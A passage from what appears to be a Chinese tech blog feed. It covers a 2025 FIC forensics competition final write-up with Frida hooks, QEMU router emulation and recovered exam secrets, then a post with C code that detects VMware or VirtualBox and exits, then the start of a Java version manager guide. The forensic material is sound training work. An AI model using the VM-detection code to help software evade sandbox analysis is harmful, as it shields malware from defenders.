class="number">1</span></span><br><span class="line">        output_file = excel_file.stem + <span class="string">&#x27;_decrypted.xlsx&#x27;</span></span><br><span class="line">        df.to_excel(output_file, index=<span class="literal">False</span>, engine=<span class="string">&#x27;openpyxl&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;解密后的文件已保存为: <span class="subst">&#123;output_file&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">import</span> traceback</span><br><span class="line">        traceback.print_exc()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src="/2025/10/17/2025FICfinal/image-20251016192013-aoybh53.png" alt="image">​</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251016192324-zcwx0lc.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">29</span><br></pre></td></tr></table></figure>

<p>65.(填空)请分析检材3数据库，在 products 表中，统计型号为 “ZK” 的总销售额（金额只保留整数部分，不进行四舍五入） (参考格式:10000) 分值:26</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251016192715-3pwggfz.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">106450</span><br></pre></td></tr></table></figure>

<p>66.(填空)请分析检材4，该检材的系统版本号为 (参考格式:1.1.1) 分值:16</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251016195454-xifbbeb.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">24.10.0</span><br></pre></td></tr></table></figure>

<p>67.(填空)请分析检材4，该检材的lan口ip为 分值:19</p>
<p>搜<code>ipaddr</code>​</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251016195845-6qlbitq.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.3.1</span><br></pre></td></tr></table></figure>

<p>仿真后：</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251016204603-34xgl5w.png" alt="image">​</p>
<p>68.(填空)请分析检材4，该检材Overlayfs分区的大小为多少KB (参考格式:123) 分值:23</p>
<p>这个题应该是必须要仿真，<code>df</code>​命令是实时计算出来的</p>
<p>先安装<code>qemu</code>​</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install qemu-system-x86 qemu-system-arm qemu-utils</span><br></pre></td></tr></table></figure>

<p>把<code>E01</code>​转换成<code>RAW</code>​</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ewfexport -t raw -u 检材4-路由器.E01</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-system-aarch64 \</span><br><span class="line">      -m 512M \</span><br><span class="line">      -cpu cortex-a57 \</span><br><span class="line">      -M virt \</span><br><span class="line">      -bios /usr/share/qemu-efi-aarch64/QEMU_EFI.fd \</span><br><span class="line">      -drive file=raw.raw,format=raw,snapshot=on,<span class="keyword">if</span>=none,<span class="built_in">id</span>=hd0 \    注意这里的raw.raw，改成刚才导出来的raw文件</span><br><span class="line">      -device virtio-blk-device,drive=hd0 \</span><br><span class="line">      -netdev user,<span class="built_in">id</span>=net0,hostfwd=tcp::8080-:80,hostfwd=tcp::2222-:22 \</span><br><span class="line">      -device virtio-net-device,netdev=net0 \</span><br><span class="line">      -nographic</span><br></pre></td></tr></table></figure>

<p><img src="/2025/10/17/2025FICfinal/image-20251016204522-m2rfjzj.png" alt="image">​</p>
<p>选第一个，进来即可</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251016204953-vqxtgdy.png" alt="image">​</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">8292024</span><br></pre></td></tr></table></figure>

<p>69.(填空)请分析检材4，该检材中VPN网络私钥为 (参考格式:Abc@123) 分值:23</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251016205030-5kcbuy6.png" alt="image">​</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SLkCLyRhrkWIFgJWfEd0B7s99FYWJf9PUV+scj3Vw3U=</span><br></pre></td></tr></table></figure>

<p>70.(填空)请分析检材4，嫌疑人交代其开发了一款专门用于收集其售出摄像头信息的服务程序。请问该摄像头信息收集服务程序编译器版本为？ (参考格式:1.1.1) 分值:23</p>
<p>前面搜openwrt搜出来了gcc</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251016205238-y6fdu04.png" alt="image">​</p>
<p>或者看仿真后把程序拿出来（仿真取出文件方法在下一题）</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251016213239-bdbp8bx.png" alt="image">​</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">13.3.0</span><br></pre></td></tr></table></figure>

<p>71.(填空)请分析检材4，该摄像头信息收集程序支持的运行参数（命令行参数）数量为多少 (参考格式:1) 分值:26</p>
<p>需要从qemu中把这个程序弄出来，这里采用共享文件夹方法</p>
<p>先使用<code>halt</code>​把qemu关机</p>
<p>然后使用如下参数的启动方式：<code>start_qemu.sh</code>​</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">qemu-system-aarch64 \</span><br><span class="line">      -m 512M \</span><br><span class="line">      -cpu cortex-a57 \</span><br><span class="line">      -M virt \</span><br><span class="line">      -bios /usr/share/qemu-efi-aarch64/QEMU_EFI.fd \</span><br><span class="line">      -drive file=raw.raw,format=raw,snapshot=on,<span class="keyword">if</span>=none,<span class="built_in">id</span>=hd0 \</span><br><span class="line">      -device virtio-blk-device,drive=hd0 \</span><br><span class="line">      -netdev user,<span class="built_in">id</span>=net0,hostfwd=tcp::8080-:80,hostfwd=tcp::2222-:22 \</span><br><span class="line">      -device virtio-net-device,netdev=net0 \</span><br><span class="line">      -virtfs <span class="built_in">local</span>,path=./qemu_share,mount_tag=host0,security_model=none,<span class="built_in">id</span>=host0 \      注意这里的qemu_share文件夹，这个是宿主机的共享文件夹，需要先创建</span><br><span class="line">      -nographic</span><br></pre></td></tr></table></figure>

<p>然后，在<code>/mnt</code>​创建一个文件夹<code>/mnt/host</code>​</p>
<p>再挂载</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mount -t 9p -o trans=virtio,version=9p2000.L,msize=262144 host0 /mnt/host</span><br></pre></td></tr></table></figure>

<p>然后<code>cp ~/password_collector /mnt/host</code>​</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251016213152-mo2lmd1.png" alt="image">​</p>
<p>这样就有了</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251016214548-5sphrql.png" alt="image">​</p>
<p>两个参数</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure>

<p>72.(多选)请分析检材4，该摄像头信息收集程序使用了什么算法进行加密 分值:23<br>A.MD5<br>B.AES<br>C.BASE64<br>D.DES</p>
<p>main函数里有这两个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BC</span><br></pre></td></tr></table></figure>

<p>73.(填空)请分析检材4，该摄像头信息收集程序所使用的数据库文件名为 (参考格式:abc.txt) 分值:23</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251016215045-vmen9ot.png" alt="image">​</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251016215751-wx5pts9.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">collected.txt</span><br></pre></td></tr></table></figure>

<p>74.(多选)请分析检材4，该摄像头信息收集程序收集了以下哪些摄像头信息？ 分值:26<br>A.IP 地址<br>B.摄像头密码<br>C.备注信息<br>D.电话号码</p>
<blockquote>
<p>这题没有collected.txt文件，被删除了，且被重新填充了，没找到怎么做</p>
</blockquote>
<p>75.(填空)请分析检材5，该检材的包名为 (参考格式:aaa.bbb.ccc) 分值:19</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251017110007-ez3qkth.png" alt="image">​</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">com.forensix.cam</span><br></pre></td></tr></table></figure>

<p>76.(填空)请分析检材5，该检材的签名证书 MD5 值为 (参考格式:202cb962ac59075b964b07152d234b70) 分值:19</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251017110059-uatzmdu.png" alt="image">​</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">7B1963B70FBAC57A50836E9A044D0029</span><br></pre></td></tr></table></figure>

<p>77.(多选)请分析检材5，在尝试抓包登录 APP 时，登录请求中提交的参数包括：（请使用比武U盘中提供的智能家居账号密码进行登录抓包） 分值:23<br>A.devicename<br>B.password<br>C.id<br>D.flag</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251017110214-yogcku5.png" alt="image">​</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">BCD</span><br></pre></td></tr></table></figure>

<p>78.(填空)请分析检材5，通过抓包分析登录请求，获取到的 flag 参数的值为 (参考格式:abc123asd56) 分值:23</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> c = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;e1.c&quot;</span>)</span><br><span class="line">    c[<span class="string">&quot;a&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">str</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`c.a is called: <span class="subst">$&#123;str&#125;</span>`</span>)</span><br><span class="line">        <span class="keyword">let</span> result = <span class="variable language_">this</span>[<span class="string">&quot;a&quot;</span>](str)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`c.a result: <span class="subst">$&#123;result&#125;</span>`</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)  </span><br></pre></td></tr></table></figure>

<p><img src="/2025/10/17/2025FICfinal/image-20251017132053-9bcevur.png" alt="image">​</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251017132303-4dl675f.png" alt="image">​</p>
<p>前十位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">05d8cccb5f</span><br></pre></td></tr></table></figure>

<p>79.(填空)请分析检材5，该 APK 登录请求中携带了一个远程调证 ID，分析该请求并提取该 ID，统计其长度为（请提取该 ID 并在比武平台中进行调证，准备进入下一阶段分析，可参考比武 U 盘中的手册） (参考格式:1) 分值:23</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251017132455-nw5m5yw.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6</span><br></pre></td></tr></table></figure>

<p>80.(填空)请分析检材5，在登录成功后，应用会跳转至 “欢迎使用 forensix” 界面。该界面对应的 Activity 类的完整类名为 (参考格式:com.bb.cc.ee.ff) 分值:26</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">      globalThis.<span class="property">ga</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">          <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;android.app.Activity&quot;</span>, &#123;</span><br><span class="line">              <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">a</span>) &#123;</span><br><span class="line">                  <span class="keyword">if</span> (a.<span class="property">mResumed</span> &amp;&amp; a.<span class="property">mResumed</span>.<span class="property">value</span>) &#123;</span><br><span class="line">                      <span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="title function_">getClass</span>().<span class="title function_">getName</span>());</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;,</span><br><span class="line">              <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">          &#125;);</span><br><span class="line">      &#125;;</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<p><img src="/2025/10/17/2025FICfinal/image-20251017133003-lvi4vhj.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">com.forensix.cam.activity.c75e3a8b2d</span><br></pre></td></tr></table></figure>

<p>81.(填空)请分析检材5，分析上述 Activity 类后，发现其内部定义的 TAG 常量值为： (参考格式:999) 分值:26</p>
<p>找到<code>com.forensix.cam.activity.c75e3a8b2d</code>​</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251017133409-gdkcizh.png" alt="image">​</p>
<p>82.(填空)请结合互联网分析APP调证检材，该检材系统版本号为(完成调证后，可参考比武 U 盘中的手册，在云实验室中继续完成取证任务) (参考格式:1.1) 分值:19</p>
<blockquote>
<p>无检材</p>
</blockquote>
<p>83.(填空)请结合互联网分析APP调证检材，该检材系统内FLAG值为(完成调证后，可参考比武 U 盘中的手册，在云实验室中继续完成取证任务) (参考格式:123456) 分值:23</p>
<blockquote>
<p>无检材</p>
</blockquote>
<p>84.(多选)请综合分析，陈某进行了那些操作 分值:23<br>A.VC加密Linux系统<br>B.VC加密Windows系统<br>C.VC加密文件<br>D.VC加密系统容器</p>
<p>VC加密了<code>Windows 分区3</code>​，加密文件为<code>我的手机号</code>​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BC</span><br></pre></td></tr></table></figure>

<p>85.(单选)请综合分析，陈某没有使用过以下那种方式安装数据库 分值:23<br>A.编译安装<br>B.包管理器安装<br>C.容器安装<br>D.单文件</p>
<p><code>UUID</code>​镜像是Debian，通过apt管理，docker有一个mysql的容器，路由器的数据库是文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br></pre></td></tr></table></figure>

<p>86.(多选)请综合分析，陈某使用过以下那些系统 分值:23<br>A.Windows<br>B.MacOS<br>C.Debian<br>D.CentOS<br>E.Fedora</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AC</span><br></pre></td></tr></table></figure>

<p>87.(单选)请综合分析，以下说法正确的是<br>1.陈某将正确的助记词藏在了Linux中<br>2.陈某将正确的助记词藏在了windows中<br>3.陈某电子数据中保留了孙某的欠条<br>4.陈某电子数据中保留了王某的欠条<br>5.陈某使用JAVA搭建后台接口<br>6.陈某和“香格里拉大酒店”有关 分值:26<br>A.1245<br>B.2356<br>C.146<br>D.246<br>E.1235</p>
<p>正确的助记词应该是那个图片的隐写，应该是在Windows中</p>
<p>欠条在前面的<code>我的手机号</code>​加密文件中有，<code>王某</code>​</p>
<p>后台是用<code>Node</code>​搭建的</p>
<p>香格里拉大酒店在初赛中有</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D</span><br></pre></td></tr></table></figure>

<p>88.(单选)请综合分析，陈某现有电子数据没有以下那个Linux内核版本 分值:29<br>A.4.14-arm<br>B.6.6-arm<br>C.4.15-x64<br>D.6.8-x64</p>
<p>Android 手机的 Linux 内核版本为 <code>4.14-arm</code>​.</p>
<p>Ubuntu 服务器的 Linux 内核版本为 <code>6.8-x64</code>​.</p>
<p>OpenWRT 的 Linux 内核版本为 <code>6.6-arm</code>​.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C</span><br></pre></td></tr></table></figure>

<p>89.(填空)请综合分析，陈某做为壁纸的邪影芳灵原图的sm3值为 分值:19</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251017104647-duzjtm2.png" alt="image">​</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;</span></span><br><span class="line"><span class="string">      from gmssl import sm3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      with open(&#x27;tf11willow1.jpg&#x27;, &#x27;rb&#x27;) as f:</span></span><br><span class="line"><span class="string">          data = f.read()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      sm3_hash = sm3.sm3_hash(list(data))</span></span><br><span class="line"><span class="string">      print(sm3_hash)</span></span><br><span class="line"><span class="string">      &quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0300a48e6acefef6ebc6ff64b957b42880febb66b5c807c7e3d7d3c3ccad2661</span><br></pre></td></tr></table></figure>

<p>90.(填空)请结合分析，陈某的真实GitHub密码为 (参考格式:Abc123) 分值:19</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251017105114-lzovz2o.png" alt="image">​</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251017152731403.png" alt="image-20251017152731403"></p>
<p><img src="/2025/10/17/2025FICfinal/image-20251017152758751.png" alt="image-20251017152758751"></p>
<p>这个大小跟最新的那个不一样</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251017153028389.png" alt="image-20251017153028389"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Forensix666</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>检测虚拟机环境</title>
    <url>/2024/07/11/DetectVM/</url>
    <content><![CDATA[<p>
    <div style="font-size: 50px; font-weight: bold;  color: black">
    检测虚拟机环境
  </div>
<br>
</p>


<p>今天在写程序时，不想让这个程序在虚拟机上运行</p>
<span id="more"></span>

<p>于是尝试了一下代码：</p>
<h2 id="注册表和硬件检测"><a href="#注册表和硬件检测" class="headerlink" title="注册表和硬件检测"></a>注册表和硬件检测</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数声明</span></span><br><span class="line">BOOL <span class="title function_">CheckRegistry</span><span class="params">()</span>;</span><br><span class="line">BOOL <span class="title function_">CheckHardware</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (CheckRegistry() || CheckHardware()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;可能运行在虚拟机中。\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;未检测到虚拟机。\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查注册表</span></span><br><span class="line">BOOL <span class="title function_">CheckRegistry</span><span class="params">()</span> &#123;</span><br><span class="line">    HKEY hKey;</span><br><span class="line">    LONG lResult;</span><br><span class="line">    DWORD dwType, dwSize;</span><br><span class="line">    <span class="type">char</span> szBuffer[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查VMware注册表项</span></span><br><span class="line">    lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, <span class="string">&quot;SOFTWARE\\VMware, Inc.\\VMware Tools&quot;</span>, <span class="number">0</span>, KEY_READ, &amp;hKey);</span><br><span class="line">    <span class="keyword">if</span> (lResult == ERROR_SUCCESS) &#123;</span><br><span class="line">        RegCloseKey(hKey);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查VirtualBox注册表项</span></span><br><span class="line">    lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, <span class="string">&quot;SOFTWARE\\Oracle\\VirtualBox Guest Additions&quot;</span>, <span class="number">0</span>, KEY_READ, &amp;hKey);</span><br><span class="line">    <span class="keyword">if</span> (lResult == ERROR_SUCCESS) &#123;</span><br><span class="line">        RegCloseKey(hKey);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查硬件信息</span></span><br><span class="line">BOOL <span class="title function_">CheckHardware</span><span class="params">()</span> &#123;</span><br><span class="line">    SYSTEM_INFO sysInfo;</span><br><span class="line">    GetSystemInfo(&amp;sysInfo);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查处理器数量</span></span><br><span class="line">    <span class="keyword">if</span> (sysInfo.dwNumberOfProcessors &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查物理内存</span></span><br><span class="line">    MEMORYSTATUSEX memInfo;</span><br><span class="line">    memInfo.dwLength = <span class="keyword">sizeof</span>(memInfo);</span><br><span class="line">    GlobalMemoryStatusEx(&amp;memInfo);</span><br><span class="line">    <span class="keyword">if</span> (memInfo.ullTotalPhys &lt; <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">1024</span>) &#123; <span class="comment">// 小于1GB</span></span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol>
<li><p><strong>CheckRegistry函数</strong>：检查系统注册表中是否存在与虚拟机相关的注册表项。例如，VMware和VirtualBox在安装时会在注册表中添加特定的项。</p>
</li>
<li><p><strong>CheckHardware函数</strong>：检查系统的硬件信息，如处理器数量和物理内存大小。虚拟机通常具有较少的处理器和较小的内存。</p>
</li>
</ol>
<h3 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h3><p>   虚拟机可能会隐藏特征来避免被检测，在实际操作中，检测注册表确实没法判断成功程序所在环境为虚拟机，仍然能运行成功。</p>
<h2 id="GPU检测"><a href="#GPU检测" class="headerlink" title="GPU检测"></a>GPU检测</h2><p>突然想到了在打开任务管理器时，主机会显示GPU，而虚拟机不会显示GPU</p>
<p><strong>主机</strong>：<img src="/2024/07/11/DetectVM/image-20240711130459658.png" alt="image-20240711130459658" style="zoom:80%;"></p>
<p><strong>虚拟机Win11</strong>：<img src="/2024/07/11/DetectVM/image-20240711130535937.png" alt="image-20240711130535937" style="zoom:80%;"></p>
<p><strong>虚拟机Win10</strong>：<img src="/2024/07/11/DetectVM/image-20240711130613593.png" alt="image-20240711130613593" style="zoom:80%;"></p>
<h3 id="检测GPU信息"><a href="#检测GPU信息" class="headerlink" title="检测GPU信息"></a>检测GPU信息</h3><p>但是在使用程序检测GPU时，仍然在虚拟机中检测出：<img src="/2024/07/11/DetectVM/image-20240711130804118.png" alt="image-20240711130804118"></p>
<p>但是，这里发现GPU有很明显的特征，<strong>适配器名称有VMware字段</strong></p>
<p>所以，获取到GPU信息后，匹配一下适配器名称中有没有VMware或者VirtualBox字段</p>
<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 辅助函数：检查字符串是否包含特定子字符串（不区分大小写）</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">containsSubstring</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str, <span class="type">const</span> <span class="type">char</span>* substr)</span> &#123;</span><br><span class="line">	<span class="type">char</span> lowerStr[<span class="number">128</span>];</span><br><span class="line">	<span class="type">char</span> lowerSubstr[<span class="number">128</span>];</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 将字符串和子字符串转换为小写</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; str[i] &amp;&amp; i &lt; <span class="number">127</span>; i++) &#123;</span><br><span class="line">		lowerStr[i] = <span class="built_in">tolower</span>((<span class="type">unsigned</span> <span class="type">char</span>)str[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	lowerStr[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; substr[i] &amp;&amp; i &lt; <span class="number">127</span>; i++) &#123;</span><br><span class="line">		lowerSubstr[i] = <span class="built_in">tolower</span>((<span class="type">unsigned</span> <span class="type">char</span>)substr[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	lowerSubstr[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strstr</span>(lowerStr, lowerSubstr) != <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">GPUProcDetect</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 初始化Direct3D</span></span><br><span class="line">	IDirect3D9* pD3D = Direct3DCreate9(D3D_SDK_VERSION);</span><br><span class="line">	<span class="keyword">if</span> (pD3D == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Direct3D 初始化失败\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 获取系统中第一个显示适配器的信息</span></span><br><span class="line">	D3DADAPTER_IDENTIFIER9 adapterIdentifier;</span><br><span class="line">	HRESULT hr = pD3D-&gt;GetAdapterIdentifier(D3DADAPTER_DEFAULT, <span class="number">0</span>, &amp;adapterIdentifier);</span><br><span class="line">	<span class="keyword">if</span> (FAILED(hr)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;获取适配器信息失败\n&quot;</span>);</span><br><span class="line">		pD3D-&gt;Release();</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 输出适配器信息</span></span><br><span class="line">	<span class="comment">/*printf(&quot;适配器名称: %s\n&quot;, adapterIdentifier.Description);</span></span><br><span class="line"><span class="comment">	printf(&quot;设备名称: %s\n&quot;, adapterIdentifier.DeviceName);</span></span><br><span class="line"><span class="comment">	printf(&quot;设备驱动版本: %d.%d.%d.%d\n&quot;,</span></span><br><span class="line"><span class="comment">		HIWORD(adapterIdentifier.DriverVersion.HighPart),</span></span><br><span class="line"><span class="comment">		LOWORD(adapterIdentifier.DriverVersion.HighPart),</span></span><br><span class="line"><span class="comment">		HIWORD(adapterIdentifier.DriverVersion.LowPart),</span></span><br><span class="line"><span class="comment">		LOWORD(adapterIdentifier.DriverVersion.LowPart));*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 检查适配器名称是否包含VMware或VirtualBox</span></span><br><span class="line">	<span class="keyword">if</span> (containsSubstring(adapterIdentifier.Description, <span class="string">&quot;vmware&quot;</span>) || containsSubstring(adapterIdentifier.Description, <span class="string">&quot;virtualbox&quot;</span>)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;检测到虚拟机环境，程序将退出。\n&quot;</span>);</span><br><span class="line">		pD3D-&gt;Release();</span><br><span class="line">		Sleep(<span class="number">3000</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 释放Direct3D对象</span></span><br><span class="line">	pD3D-&gt;Release();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/11/DetectVM/image-20240711131135615.png" alt="image-20240711131135615"></p>
<p>这也只是一种现在比较可行的简单的检测方法，不保证可能厂商以后把这个特征也抹除</p>
]]></content>
      <categories>
        <category>Study Essay</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Virtual Environment</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows下的Java多版本管理</title>
    <url>/2024/11/18/JavaVersionManager/</url>
    <content><![CDATA[<h1 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h1><p>注意：此版本管理器用来设置全局Java版本，暂无局部修改功能（以后可能会加吧……）</p>
<span id="more"></span>

<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><div style="display:flex; justify-content: center; flex-direction: column; align-items: center">
    <text>点击下方可以下载jvm.exe，放到一个不碍事的地方（藏起来也可以）</text>
    <br>
    <a href="https://creeeeeeeeeeper.github.io//2024/11/18/JavaVersionManager/jvm.exe" alt="jvm.exe"><div style="display: flex; flex-direction:row; border: solid 1px #cccccc; height: 60px;">
        <image src="https://creeeeeeeeeeper.github.io//2024/11/18/JavaVersionManager/image-20241123213209246.png" style="scale: 0.6; margin-top: 10px"></image>
        <div style="display: flex; flex-direction: column; font-size: 12.5px; padding-right: 15px; margin-top: 10px">
            <text>jvm.exe</text>
            <text style="font-size: 8px; color: #cccccc">17.92Kb</text>
        </div>
    </div></a>
</div>

<h2 id="配置系统变量"><a href="#配置系统变量" class="headerlink" title="配置系统变量"></a>配置系统变量</h2><p>首先确保系统变量和用户变量中没有配乱的Java环境变量，建议全部删除掉</p>
<p>全部删掉后，在系统变量中新建一个<code>CLASSPATH</code>变量，值为<code>%JAVA_HOME%\lib;%JAVA_HOME%\lib\tools.jar;%JAVA_HOME%\bin</code>。</p>
<img src="/2024/11/18/JavaVersionManager/image-20241119112656615.png" alt="image-20241119112656615" style="zoom:50%;">

